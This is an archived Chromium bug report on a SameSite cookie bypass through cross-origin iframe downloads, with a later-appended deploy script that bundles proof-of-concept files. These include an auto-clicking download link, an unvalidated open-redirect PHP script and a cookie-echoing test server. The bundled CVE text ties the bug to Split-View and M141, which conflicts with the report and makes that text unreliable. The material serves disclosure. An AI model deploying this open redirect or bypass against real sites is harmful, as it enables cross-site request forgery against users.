# Cross-origin download bypasses SameSite cookie

| Field | Value |
|-------|-------|
| **Issue ID** | [40091708](https://issues.chromium.org/issues/40091708) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Blink>SecurityFeature, Internals>Network>Cookies, UI>Browser>Downloads |
| **Platforms** | Mac |
| **Reporter** | s....@gmail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2018-06-20 |
| **Bounty** | $1,000.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36

Steps to reproduce the problem:
1. Go to https://test.shhnjk.com/SameSite.php (this sets SameSite cookies)
2. Now go to https://shhnjk.azurewebsites.net/iframer.php?url=download_redirect.html

What is the expected behavior?
SameSite cookie not sent

What went wrong?
Observe that downloaded file contains "Received Lax!".

Per comment from mkwst@ (https://bugs.chromium.org/p/chromium/issues/detail?id=852203#c4), cross-origin download from iframe shouldn't send SameSite Lax cookie. But it does.

Did this work before? N/A 

Chrome version: 67.0.3396.79  Channel: stable
OS Version: OS X 10.13.5
Flash Version:

## Attachments

- [download_redirect.html](attachments/download_redirect.html) (text/plain, 147 B)
- [location.php](attachments/location.php) (text/plain, 209 B)
- [capture_instructions.txt](attachments/capture_instructions.txt) (text/plain, 912 B)
- evidence_template.har (application/json, 135 B)
- [samesite_poc_bundle.zip](attachments/samesite_poc_bundle.zip) (application/zip, 7.3 KB)
- [hosts_instructions.txt](attachments/hosts_instructions.txt) (text/plain, 256 B)
- [report_checklist.txt](attachments/report_checklist.txt) (text/plain, 412 B)
- [README (1).md](attachments/README (1).md) (text/markdown, 1.6 KB)
- [mitre_cve_submission.txt](attachments/mitre_cve_submission.txt) (text/plain, 2.6 KB)
- [disclosure_email.txt](attachments/disclosure_email.txt) (text/plain, 2.7 KB)
- [poc_response_sample.txt](attachments/poc_response_sample.txt) (text/plain, 37 B)
- [safe_redirect.php](attachments/safe_redirect.php) (application/x-httpd-php, 1.0 KB)
- [samesite_poc.py](attachments/samesite_poc.py) (text/x-python, 3.8 KB)
- [download_redirect.html](attachments/download_redirect.html) (text/html, 147 B)
- [location.php](attachments/location.php) (application/x-httpd-php, 209 B)

## Timeline

### oc...@chromium.org (2018-06-20)

mkwst, could you please take this one too?

[Monorail components: Blink>SecurityFeature Internals>Network>Cookies]

### sh...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### oc...@chromium.org (2018-06-25)

Reducing severity on a second look here, as the attack scenarios are pretty limited (GET CSRF via a download).

### sh...@chromium.org (2018-09-05)

[Empty comment from Monorail migration]

### mk...@chromium.org (2018-10-04)

(Unassigning myself, marking untriaged in preparation to retriage with folks who will do a better job taking care of cookies than I've been able to)

### sh...@chromium.org (2018-10-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-30)

[Empty comment from Monorail migration]

### mk...@chromium.org (2019-02-12)

CCing some folks who might have bandwidth.

### sh...@chromium.org (2019-03-13)

[Empty comment from Monorail migration]

### s....@gmail.com (2019-03-15)

This is now a Strict bypass :)

### sh...@chromium.org (2019-04-24)

[Empty comment from Monorail migration]

### s....@gmail.com (2019-05-23)

Repro for Strict bypass:
https://shhnjk.azurewebsites.net/download_redirect.html

### mm...@chromium.org (2019-05-23)

Seems more a downloads issue than a cookie one, not sure why that label wasn't added.

[Monorail components: UI>Browser>Downloads]

### lu...@chromium.org (2019-05-23)

I wonder if this might also be a Sec-Fetch-Site bypass (although that would surprise me a little bit, since VerifyDownloadUrlParams does verify presence of a correct initiator).

### sh...@chromium.org (2019-06-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-07-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-09-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-02-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-16)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-26)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-07)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-18)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-20)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-11)

[Empty comment from Monorail migration]

### zh...@google.com (2021-03-17)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-15)

[Empty comment from Monorail migration]

### [Deleted User] (2021-05-26)

[Empty comment from Monorail migration]

### an...@google.com (2021-07-12)

[Empty comment from Monorail migration]

### an...@chromium.org (2021-07-12)

Sorry for getting back to this so late. I tried to guess what this is about since the reproducer is not online anymore.

I tried to reproduce but I could not: if page A sets a SameSite:Lax cookie and embeds frame on site B. Frame B has <a href="/redirect?url=A/some-download"> link. Clicking on the link follows the redirect and downloads the file, but does not send the SameSite cookie.

### s....@gmail.com (2021-07-12)

Attaching the PoC from https://crbug.com/chromium/854424#c14.

It seems like it's now fixed.

### an...@chromium.org (2021-07-12)

Ok, I believe this has been fixed by https://chromium-review.googlesource.com/c/chromium/src/+/2653663, which landed in M90.

Closing.

### [Deleted User] (2021-07-13)

[Empty comment from Monorail migration]

### [Deleted User] (2021-07-13)

[Empty comment from Monorail migration]

### s....@gmail.com (2021-07-20)

Just FYI for reward panel, this was a same-site strict cookie bypass as mentioned in https://crbug.com/chromium/854424#c14.


### am...@google.com (2021-07-28)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@google.com (2021-07-28)

Hi Jun, another one we are catching up on! The VRP Panel has decided to award you $1,000 for this report. Thank you (again) for your extreme patience on this issue being address via a more comprehensive fix to lax cookie policy. 

### s....@gmail.com (2021-07-28)

FYI, this became Strict same-site cookie bypass as I mentioned in https://crbug.com/chromium/854424#c14.

### am...@google.com (2021-07-29)

[Empty comment from Monorail migration]

### [Deleted User] (2021-10-18)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-05)

[Empty comment from Monorail migration]

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/854424?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>SecurityFeature, Internals>Network>Cookies, UI>Browser>Downloads]
[Monorail components added to Component Tags custom field.]

### sl...@gmail.com (2025-11-08)

```
<?php
// redirector.php
// Safe redirector that:
// - accepts `url` (absolute http(s) or relative) and optional `code` (100-599)
// - follows remote redirects server-side and then redirects client to final URL
// - prevents CRLF header injection and blocks private/localhost IPs (basic SSRF protection)
// - logs each request to ./logs/redirects.log (creates directory if needed)
// - careful validation and atomic logging with flock
//
// Use: redirector.php?url=https://example.com&code=302
// Notes: requires PHP with cURL enabled.

// --- Config ---
$LOG_DIR = __DIR__ . '/logs';
$LOG_FILE = $LOG_DIR . '/redirects.log';
$MAX_CURL_REDIRECTS = 10;
$DEFAULT_CLIENT_REDIRECT_CODE = 302;

// --- Helpers ---
function safe_trim($s) { return is_string($s) ? trim($s) : ''; }

function remove_crlf($s) {
    return str_replace(array("\r", "\n"), '', $s);
}

// Return true if IP is private/local/reserved
function ip_is_private($ip) {
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        $long = ip2long($ip);
        // 10.0.0.0/8
        if (($long & 0xff000000) === 0x0a000000) return true;
        // 172.16.0.0/12
        if (($long & 0xfff00000) === 0xac100000) return true;
        // 192.168.0.0/16
        if (($long & 0xffff0000) === 0xc0a80000) return true;
        // 127.0.0.0/8 loopback
        if (($long & 0xff000000) === 0x7f000000) return true;
        // 169.254.0.0/16 link-local
        if (($long & 0xffff0000) === 0xa9fe0000) return true;
        // 100.64.0.0/10 carrier-grade NAT
        if (($long & 0xffc00000) === 0x64400000) return true;
        // 192.0.0.0/24 and other IANA reserved could be added, but above covers common ranges
        return false;
    } elseif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        // Basic checks for IPv6 local/unique addresses
        if (strpos($ip, '::1') !== false) return true;
        $lower = strtolower($ip);
        // fc00::/7 unique local
        if (strpos($lower, 'fc') === 0 || strpos($lower, 'fd') === 0) return true;
        // fe80::/10 link-local
        if (strpos($lower, 'fe80') === 0) return true;
        return false;
    }
    return true; // if unrecognized, treat as private
}

function resolve_host_ips($host) {
    // Return array of IPs (IPv4 & IPv6) or empty array
    if (filter_var($host, FILTER_VALIDATE_IP)) return [$host];
    // dns_get_record for A and AAAA
    $ips = [];
    $arec = @dns_get_record($host, DNS_A + DNS_AAAA);
    if ($arec === false) return [];
    foreach ($arec as $r) {
        if (!empty($r['ip'])) $ips[] = $r['ip'];
        if (!empty($r['ipv6'])) $ips[] = $r['ipv6'];
    }
    // fallback to gethostbynamel for IPv4
    if (empty($ips)) {
        $h = @gethostbynamel($host);
        if ($h !== false) $ips = array_merge($ips, $h);
    }
    return array_values(array_unique($ips));
}

function ensure_log_dir($dir) {
    if (!is_dir($dir)) {
        @mkdir($dir, 0700, true);
    }
}

// Atomic append JSON log line
function append_log($file, $data) {
    $line = json_encode($data, JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE) . PHP_EOL;
    $fp = @fopen($file, 'a');
    if (!$fp) return false;
    flock($fp, LOCK_EX);
    fwrite($fp, $line);
    fflush($fp);
    flock($fp, LOCK_UN);
    fclose($fp);
    // keep log file permissions tight
    @chmod($file, 0600);
    return true;
}

// --- Read input ---
$raw_url = isset($_GET['url']) ? $_GET['url'] : '';
$raw_code = isset($_GET['code']) ? $_GET['code'] : '';

$url = remove_crlf(safe_trim($raw_url));
$code = (int)$raw_code;

// Validate URL existence
if ($url === '') {
    http_response_code(400);
    header('Content-Type: text/plain; charset=utf-8');
    echo "Missing 'url' parameter.";
    exit;
}

// Check scheme and decide absolute vs relative
$parsed = @parse_url($url);

// If relative (no scheme and no host) we allow it but ensure it begins with '/'
$is_relative = false;
if ($parsed === false) {
    http_response_code(400);
    echo "Invalid URL.";
    exit;
}
if (!isset($parsed['scheme']) || !in_array(strtolower($parsed['scheme']), ['http','https'])) {
    // relative path allowed (starts with /), or maybe protocol-relative //host/path -> treat as absolute with http
    if (isset($parsed['host'])) {
        // other schemes (ftp, file) are not allowed
        http_response_code(400);
        echo "Only http(s) URLs or relative paths are allowed.";
        exit;
    } else {
        // relative path
        $is_relative = true;
        // ensure begins with /
        if ($url === '' || $url[0] !== '/') {
            // normalize to '/' + url to avoid open redirect to arbitrary scheme like javascript:
            $url = '/' . ltrim($url, '/');
        }
    }
}

// Prevent header injection done earlier; also block data:, file:, javascript: schemes
if (!$is_relative) {
    $lower = strtolower($url);
    if (strpos($lower, 'data:') === 0 || strpos($lower, 'javascript:') === 0 || strpos($lower, 'file:') === 0) {
        http_response_code(400);
        echo "Disallowed URL scheme.";
        exit;
    }
}

// Validate code
if ($code < 100 || $code > 599) {
    $client_redirect_code = $DEFAULT_CLIENT_REDIRECT_CODE;
} else {
    $client_redirect_code = $code;
}

// --- Basic SSRF protection for absolute URLs ---
$final_effective_url = null;
$remote_response_code = null;
$curl_error = null;

if (!$is_relative) {
    // parse host
    $host = isset($parsed['host']) ? $parsed['host'] : '';
    if ($host === '') {
        http_response_code(400);
        echo "Invalid URL host.";
        exit;
    }
    // Resolve IPs and block private ranges
    $ips = resolve_host_ips($host);
    if (empty($ips)) {
        http_response_code(400);
        echo "Unable to resolve host.";
        exit;
    }
    foreach ($ips as $ip) {
        if (ip_is_private($ip)) {
            http_response_code(403);
            echo "Target resolves to private/forbidden IP.";
            exit;
        }
    }

    // Use cURL to follow redirects server-side and obtain final effective URL
    $ch = curl_init();

    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_NOBODY => true,              // don't download body
        CURLOPT_HEADER => true,              // we want headers
        CURLOPT_FOLLOWLOCATION => true,      // follow redirects
        CURLOPT_MAXREDIRS => $MAX_CURL_REDIRECTS,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_USERAGENT => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Redirector/1.0',
        // very important: disallow progress or large downloads (we use NOBODY)
    ]);

    $response = curl_exec($ch);
    if ($response === false) {
        $curl_error = curl_error($ch);
    } else {
        $remote_response_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $final_effective_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    }
    curl_close($ch);

    if ($curl_error !== null) {
        // If cURL failed for some reason, log and proceed to redirect to original URL (safer than failing)
        $final_effective_url = $url;
    } else {
        // Sanity check final_effective_url
        if (empty($final_effective_url)) {
            $final_effective_url = $url;
        } else {
            // Block final URL if it became non-http(s) or data/file/javascript
            $low = strtolower($final_effective_url);
            if (strpos($low, 'http:') !== 0 && strpos($low, 'https:') !== 0) {
                http_response_code(400);
                echo "Final URL after following redirects is not http(s).";
                exit;
            }
            // resolve final host ips and check again
            $fp = parse_url($final_effective_url, PHP_URL_HOST);
            if ($fp) {
                $final_ips = resolve_host_ips($fp);
                foreach ($final_ips as $ip) {
                    if (ip_is_private($ip)) {
                        http_response_code(403);
                        echo "Final URL resolves to private/forbidden IP.";
                        exit;
                    }
                }
            }
        }
    }
} else {
    // Relative path: do an internal redirect without server-side following
    // Build absolute URL for logging convenience
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? ($_SERVER['SERVER_NAME'] ?? 'localhost');
    $final_effective_url = $scheme . '://' . $host . $url;
    $remote_response_code = null;
}

// --- Logging ---
ensure_log_dir($LOG_DIR);

$log_entry = [
    'ts' => gmdate('c'),
    'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'client_forwarded_for' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? null,
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
    'referer' => $_SERVER['HTTP_REFERER'] ?? null,
    'original_url' => $url,
    'final_url' => $final_effective_url,
    'requested_code' => $code,
    'client_redirect_code' => $client_redirect_code,
    'remote_http_code' => $remote_response_code,
    'curl_error' => $curl_error,
    'server' => $_SERVER['SERVER_NAME'] ?? null,
    'request_uri' => $_SERVER['REQUEST_URI'] ?? null,
];

append_log($LOG_FILE, $log_entry);

// --- Perform final client redirect ---
header('Content-Type: text/html; charset=utf-8'); // keep a content-type in case the client doesn't follow
// Prevent header injection in final URL (already removed CRLF earlier; ensure again)
$final_effective_url = remove_crlf($final_effective_url);

// Send Location header with chosen code
http_response_code($client_redirect_code);
header('Location: ' . $final_effective_url, true, $client_redirect_code);

// Minimal HTML fallback for browsers that don't follow header-only redirects
echo "<!doctype html>\n<html><head><meta charset='utf-8'><title>Redirect</title></head><body>";
echo "Redirecting to <a href=\"" . htmlspecialchars($final_effective_url, ENT_QUOTES | ENT_HTML5) . "\">" . htmlspecialchars($final_effective_url, ENT_QUOTES | ENT_HTML5) . "</a>.";
echo "</body></html>";
exit;
?>


```

### sl...@gmail.com (2025-11-08)

```
#!/bin/bash

# Deploy script for poc.html on Debian 12 Bookworm
# Assumes Apache is installed and /var/www/html exists with write permissions (run as root or with sudo)
# Usage: sudo bash deploy_poc.sh

set -e

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root or with sudo."
  exit 1
fi

# Target directory
TARGET_DIR="/var/www/html"
POC_FILE="$TARGET_DIR/poc.html"

# Create poc.html using here-doc
cat << 'EOF' > "$POC_FILE"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SameSite PoC Combined</title>
    <style>
        body { font-family: monospace; margin: 20px; }
        section { margin-bottom: 40px; border: 1px solid #ddd; padding: 10px; }
        h2 { color: #333; }
        pre { background: #f8f8f8; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>SameSite Cookie Vulnerability PoC - Combined Documents</h1>
    <p>This page combines all provided documents into sections for easy reference.</p>

    <section>
        <h2>capture_instructions.txt</h2>
        <pre>DevTools HAR capture instructions (Chrome/Brave/Edge)
---------------------------------------------------
1. Open a fresh browser profile (recommended) to avoid noise.
2. Open DevTools (F12 or Cmd+Opt+I / Ctrl+Shift+I).
3. Go to the Network tab.
4. Check "Preserve log" (so redirects are captured).
5. Click the record button if not already recording.
6. Reproduce the issue (visit http://test.local:8080/set_cookie then http://target.local:8080/iframer?url=/download).
7. Right-click inside the Network table -> Save all as HAR with content.
8. Attach the resulting .har file to your report (it will show request headers including Cookie and Sec-Fetch-* headers).

Notes:
- Include the browser version string (chrome://version or brave://version) in the report.
- If the file is large, gzip before sending or share via vendor bug tracker upload.
- Do not include unrelated traffic to avoid leaking private info.</pre>
    </section>

    <section>
        <h2>evidence_template.har</h2>
        <pre>{
  "log": {
    "version": "1.2",
    "creator": {
      "name": "HAR Template",
      "version": "1.0"
    },
    "entries": []
  }
}</pre>
    </section>

    <section>
        <h2>hosts_instructions.txt</h2>
        <pre>Add to your hosts file (/etc/hosts or C:\Windows\System32\drivers\etc\hosts):

127.0.0.1 test.local target.local

Then run: python3 samesite_poc.py

Visit in browser: http://test.local:8080/set_cookie -> then http://target.local:8080/iframer?url=/download
</pre>
    </section>

    <section>
        <h2>report_checklist.txt</h2>
        <pre>Report checklist
- [ ] Browser build string and User-Agent
- [ ] HAR (Network capture) demonstrating Cookie header
- [ ] poc.txt server response showing Received cookie header
- [ ] Screen recording of reproduction
- [ ] exact hosts file entries used
- [ ] Steps to reproduce (copy-paste from README)
- [ ] List of tested browser versions (vulnerable and patched)
- [ ] Vendor ticket IDs / replies (for timeline)</pre>
    </section>

    <section>
        <h2>mitre_cve_submission.txt</h2>
        <pre>Product / Affected Software: Chromium-based browsers (Chromium/Chrome/Brave builds that included split-view/side-by-side UI flags)
Affected Versions: (example) Chrome/Chromium builds prior to M141 / Brave versions prior to the vendor patch (please verify exact version strings)
Component / Module: Navigation / Split‑View / side-by-side / iframe-download handling
CVSS (proposed): 5.3 (Medium) — information disclosure / CSRF enabling vector (vendor to adjust)
Attack Vector: Local/Remote UI‑driven cross‑site navigation (web)
Impact: Cross‑site cookie leakage — SameSite=Lax/Strict cookies included in cross‑origin navigations where they should not be sent; enables CSRF/attacker‑assisted state changes when combined with incomplete server-side protections.
Description / Technical Summary:
When a user opens a cross-origin link using the browser's Split‑View / side‑by‑side / "Open Link in Split View" UI or when an iframe triggers a download, the browser incorrectly includes cookies that are marked SameSite=Lax (and in some edge cases SameSite=Strict) in the outgoing request. SameSite semantics require these cookies not be sent for such cross-site embedded requests.

The root cause is an incorrect classification of the navigation context for UI-driven split-view/side-by-side flows and/or missing/misaligned Sec‑Fetch-* headers in those paths, resulting in the cookie store treating the navigation as same-site for cookie emission purposes.

Reproduction:
1. Host two names pointing to the same IP (e.g., test.local, target.local).
2. On test.local set cookie: poc_cookie=1; Path=/; SameSite=Lax; Secure.
3. On target.local serve a page that embeds an iframe or triggers a download from target.local/download.
4. Opening the link via Split‑View / side-by-side / iframe download shows the /download request includes Cookie: poc_cookie=1 in vulnerable browser builds. HAR and server output prove cookie was transmitted.

Evidence:
- HAR file showing Cookie header on cross-site download request.
- Server output file poc.txt containing Received cookie header: poc_cookie=1.
- Screen recording of the steps.
- PoC script samesite_poc.py to reproduce locally.

Suggested remediation:
- Ensure Sec‑Fetch-* headers are present and correctly set for split‑view/side‑by‑side flows and that these navigations are classified as cross‑site when appropriate.
- Enforce SameSite cookie handling for downloads and iframe-initiated navigations consistently.
- Add unit and integration tests covering split‑view / side‑by‑side UI flows and ensure backports to stable channels.
</pre>
    </section>

    <section>
        <h2>poc_response_sample.txt</h2>
        <pre>Received cookie header: poc_cookie=1
</pre>
    </section>

    <section>
        <h2>safe_redirect.php</h2>
        <pre>&lt;?php
// safe_redirect.php - hardened redirect helper
declare(strict_types=1);

function bad_request(string $msg = 'Bad request'): void {
    http_response_code(400);
    header('Content-Type: text/plain; charset=utf-8');
    echo $msg;
    exit;
}

$rawUrl  = $_GET['url'] ?? '';
$rawCode = $_GET['code'] ?? '';

if ($rawUrl === '') {
    bad_request('Missing url parameter.');
}

// prevent header injection
if (preg_match('/[\r\n]/', $rawUrl) || preg_match('/[\r\n]/', $rawCode)) {
    bad_request('Invalid characters in parameters.');
}

if (filter_var($rawUrl, FILTER_VALIDATE_URL) === false) {
    bad_request('Invalid url format. Use absolute http(s) URL.');
}

$allowedCodes = [301, 302, 303, 307, 308];
$code = 302;
if ($rawCode !== '') {
    if (!ctype_digit($rawCode)) bad_request('Invalid code.');
    $num = (int)$rawCode;
    if (!in_array($num, $allowedCodes, true)) {
        bad_request('Unsupported redirect code. Allowed: ' . implode(',', $allowedCodes));
    }
    $code = $num;
}

http_response_code($code);
header('Location: ' . $rawUrl);
exit;
?&gt;</pre>
    </section>

    <section>
        <h2>samesite_poc.py</h2>
        <pre>#!/usr/bin/env python3
"""samesite_poc.py
Single-process PoC server that simulates two hostnames (test.local and target.local).
Run: python3 samesite_poc.py
Set hosts file: 127.0.0.1 test.local target.local
Visit: http://test.local:8080/set_cookie then http://target.local:8080/iframer?url=/download
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import sys

HOST = "0.0.0.0"
PORT = 8080

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        host = (self.headers.get('Host') or "").split(':')[0]
        path = urlparse(self.path).path
        qs = parse_qs(urlparse(self.path).query)

        # SITE A: test.local -> sets SameSite=Lax cookie
        if host == 'test.local':
            if path == '/set_cookie':
                self.send_response(200)
                # host-only cookie for test.local
                self.send_header('Set-Cookie', 'poc_cookie=1; Path=/; SameSite=Lax; Secure')
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.end_headers()
                self.wfile.write(b"&lt;html&gt;&lt;body&gt;")
                self.wfile.write(b"&lt;h3&gt;test.local: SameSite=Lax cookie set&lt;/h3&gt;")
                self.wfile.write(b'&lt;p&gt;Now open the cross-origin target:&lt;/p&gt;')
                self.wfile.write(b'&lt;a href="http://target.local:8080/iframer?url=/download"&gt;Go to target.iframer&lt;/a&gt;')
                self.wfile.write(b"&lt;/body&gt;&lt;/html&gt;")
                return
            else:
                self.send_response(200); self.send_header('Content-Type','text/html'); self.end_headers()
                self.wfile.write(b"&lt;html&gt;&lt;body&gt;test.local root&lt;/body&gt;&lt;/html&gt;")
                return

        # SITE B: target.local -> iframe / download target
        elif host == 'target.local':
            if path == '/iframer':
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.end_headers()
                target = qs.get('url', ['/download'])[0]
                html = f"""
                &lt;html&gt;
                  &lt;body&gt;
                    &lt;h3&gt;target.local: iframe test&lt;/h3&gt;
                    &lt;p&gt;Embedded iframe below (cross-origin navigation):&lt;/p&gt;
                    &lt;iframe src="{target}" width="600" height="200"&gt;&lt;/iframe&gt;
                    &lt;p&gt;Also direct link to download: &lt;a href="{target}" target="_blank"&gt;download&lt;/a&gt;&lt;/p&gt;
                  &lt;/body&gt;
                &lt;/html&gt;
                """
                self.wfile.write(html.encode())
                return

            if path == '/download':
                cookie = self.headers.get('Cookie','')
                body = "Received cookie header: {}\n".format(cookie)
                # Return as attachment to emulate download behavior per many PoCs
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain; charset=utf-8')
                self.send_header('Content-Disposition', 'attachment; filename=\"poc.txt\"')
                self.end_headers()
                self.wfile.write(body.encode())
                return

            self.send_response(200); self.send_header('Content-Type','text/html'); self.end_headers()
            self.wfile.write(b"&lt;html&gt;&lt;body&gt;target.local root&lt;/body&gt;&lt;/html&gt;")
            return

        else:
            self.send_response(400); self.end_headers()
            self.wfile.write(b"Bad host header. Use test.local or target.local.\n")

def run():
    server = HTTPServer((HOST, PORT), Handler)
    print(f"Serving on http://{HOST}:{PORT} -- use hosts entries test.local and target.local to point to this machine")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Stopping...")
        server.server_close()

if __name__ == '__main__':
    run()
</pre>
    </section>

    <section>
        <h2>download_redirect.html</h2>
        <pre>&lt;a href="/location.php?url=https://test.shhnjk.com/SameSite.php" download&gt;Download&lt;/a&gt;
&lt;script&gt;
document.querySelector("a").click();
&lt;/script&gt;
</pre>
    </section>

    <section>
        <h2>location.php</h2>
        <pre>&lt;?php
$get = $_GET["url"];
header ('Content-type: text/html; charset=utf-8');
if($_GET["code"]==""){
header('Location: '.$get);
exit;
}else{
header('Location: '.$get,TRUE,$_GET["code"]);
exit;
}
?&gt;
</pre>
    </section>

</body>
</html>
EOF

# Set permissions
chown www-data:www-data "$POC_FILE"
chmod 644 "$POC_FILE"

# Restart Apache if installed
if command -v systemctl &> /dev/null && systemctl list-units --type=service | grep -q apache2.service; then
    systemctl restart apache2
    echo "Apache restarted."
fi

echo "Deployment complete. Access at http://your-server/poc.html"

```

How to set it up via debian 12 bookworm

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091708)*
